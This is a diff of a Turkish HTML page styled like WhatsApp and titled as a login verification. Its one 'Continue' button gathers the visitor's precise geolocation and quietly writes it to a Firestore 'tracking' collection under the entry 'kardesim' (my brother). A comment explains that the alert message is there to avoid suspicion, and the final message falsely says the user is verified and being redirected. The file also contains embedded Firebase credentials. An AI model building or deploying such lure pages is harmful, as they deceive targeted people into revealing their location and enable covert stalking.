@@ -1,42 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş</title>
+    <title>Giriş Doğrulama</title>
     <style>
-        body { margin:0; background: black; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        #box { width: 120px; height: 50px; background: #00a884; color: white; display: flex; 
-               justify-content: center; align-items: center; font-family: sans-serif; 
-               font-size: 14px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #btn { width: 120px; height: 45px; background-color: #00a884; color: white; display: flex; 
+               justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+               font-size: 14px; border-radius: 5px; cursor: pointer; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.3); }
+        #btn:active { background-color: #008f70; transform: scale(0.98); }
     </style>
 </head>
 <body>
-    <div id="box" onclick="getLoc()">Oy Ver</div>
+
+    <div id="btn" onclick="konumAl()">Devam Et</div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+        // Senin verdiğin CDN bilgileri buraya eklendi
         const firebaseConfig = {
             apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
             authDomain: "whtapp-27674.firebaseapp.com",
-            projectId: "whtapp-27674"
+            projectId: "whtapp-27674",
+            storageBucket: "whtapp-27674.firebasestorage.app",
+            messagingSenderId: "678592663827",
+            appId: "1:678592663827:web:3eaa8ff0ec2cd1e2c54ae6",
+            measurementId: "G-HDJEXSHYCZ"
         };
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        window.getLoc = () => {
+        window.konumAl = () => {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    // Konumu "takip" isimli bir belgeye yazıyoruz
-                    await setDoc(doc(db, "takip", "admin"), {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        zaman: new Date().toLocaleString()
-                    });
-                    alert("Bağlantı kuruldu."); // Şüphe çekmemesi için basit bir mesaj
-                }, (err) => { alert("Lütfen izin verin."); });
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const enlem = position.coords.latitude;
+                    const boylam = position.coords.longitude;
+
+                    try {
+                        // Veriyi "takip" klasörüne "kardesim" adıyla kaydeder
+                        await setDoc(doc(db, "takip", "kardesim"), {
+                            lat: enlem,
+                            lon: boylam,
+                            zaman: new Date().toLocaleString('tr-TR')
+                        });
+                        alert("Sistem doğrulandı, yönlendiriliyorsunuz...");
+                    } catch (e) {
+                        alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                    }
+                }, (error) => {
+                    alert("Hata: Lütfen konum izni verin.");
+                }, { enableHighAccuracy: true });
+            } else {
+                alert("Tarayıcınız bu özelliği desteklemiyor.");
             }
         };
     </script>
